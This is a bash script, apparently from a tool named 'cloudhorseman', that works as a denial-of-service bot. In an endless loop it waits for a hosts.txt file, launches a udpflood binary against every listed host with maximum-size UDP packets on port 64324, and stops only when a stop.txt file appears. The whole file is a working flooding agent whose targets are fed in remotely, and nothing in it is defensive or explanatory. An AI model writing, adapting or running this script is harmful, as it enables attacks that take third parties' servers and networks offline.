#!/usr/bin/env bash

INPUTFILEPATH="/usr/share/cloudhorseman/"
INPUTFILENAME="hosts.txt"
OUTPUTFILEPATH="/usr/share/cloudhorseman/"
OUTPUTFILENAME="output.txt"
STOPFILEPATH="/usr/share/cloudhorseman/"
STOPFILENAME="stop.txt"
UDPFLOODPATH="/usr/share/udpflood/udpflood"

#So that it never exits
while true; 
do  
    ps aux | grep -ie "udpflood" | awk '{print $2}' | xargs kill -9
    until ls "$INPUTFILEPATH" | grep "$INPUTFILENAME";
    do
        sleep 10s
    done

    printf "Input Hosts:\n" > "$OUTPUTFILEPATH$OUTPUTFILENAME"
    cat "$INPUTFILEPATH$INPUTFILENAME" >> "$OUTPUTFILEPATH$OUTPUTFILENAME"

    while read host || [ -n "$host" ];
    do
     "$UDPFLOODPATH" -h "$host" -p 64324 -t 20 -s 65507 >> "$OUTPUTFILEPATH$OUTPUTFILENAME" &
    done <  "$INPUTFILEPATH$INPUTFILENAME"

    until ls "$STOPFILEPATH" | grep "$STOPFILENAME";
    do
        sleep 10s
    done

    rm  "$INPUTFILEPATH$INPUTFILENAME"
    rm "$STOPFILEPATH$STOPFILENAME"

done